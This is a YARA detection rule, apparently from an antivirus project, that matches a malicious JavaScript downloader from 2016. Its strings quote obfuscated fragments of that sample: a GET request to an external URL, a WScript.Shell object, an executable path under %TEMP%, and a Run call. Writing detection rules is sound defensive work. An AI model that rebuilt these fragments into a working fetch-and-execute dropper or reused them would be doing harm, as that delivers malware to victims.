rule sig_20160401_e4f0f6e63b02ea60e9f85e680add0ccd {
  meta:
    description = "datamaliciousorder - file 20160401_e4f0f6e63b02ea60e9f85e680add0ccd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "50efcd94bccd98bb240b88b9d5bb4ccb84b43b2d740927601e5838cf737abf03"

  strings:
    $s1  = "XsCqq[NutRb](\"G\" + \"ET\", \"http://abnregistrationaustralia.com.au/k38sa\", false);" fullword ascii
    $s2  = "function JvEol(IbiLaq, YxdDek){NsRj = NsRj * 1; return IbiLaq - YxdDek;};" fullword ascii
    $s3  = "var YrFma = function PeuYnv() {return WScript[UwsVz](\"WScript\"+\".Shell\");}(), YvuLb = 11;" fullword ascii
    $s4  = "if (XsCqq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IqeYn(){return KgCk + \"\";};" fullword ascii
    $s6  = "function QyHqh() {return YrFma[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"RhlQkcCuhGF4k.ex\" + \"e\";};" fullword ascii
    $s7  = "function YxkSr() {return ((IhEfj == true) && (IhEfj == SbaIhb)) ? 1 : NsRj;};" fullword ascii
    $s8  = "function OkgHj(){return UwsVz;};" fullword ascii
    $s9  = "}while (MuIup);" fullword ascii
    $s10 = "function DfnDuk(GvkJti){YrFma[\"R\"+\"un\"](GvkJti, NsRj, NsRj);};" fullword ascii
    $s11 = "var IhEfj = false;" fullword ascii
    $s12 = "SbaIhb = true; " fullword ascii
    $s13 = "var NtpWyh = false;" fullword ascii
    $s14 = "var LlTuf = new this[\"Date\"]();" fullword ascii
    $s15 = "IhEfj = true; " fullword ascii
    $s16 = "function TwJj(FmdFz) {var QmPul = (1, 2, 3, 4, 5, FmdFz); return QmPul;};" fullword ascii
    $s17 = "var SbaIhb = false;" fullword ascii
    $s18 = "function JmpCi(){return 23;};" fullword ascii
    $s19 = "return JvEol(SrWd, CjdOf);" fullword ascii
    $s20 = "function MnJv()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}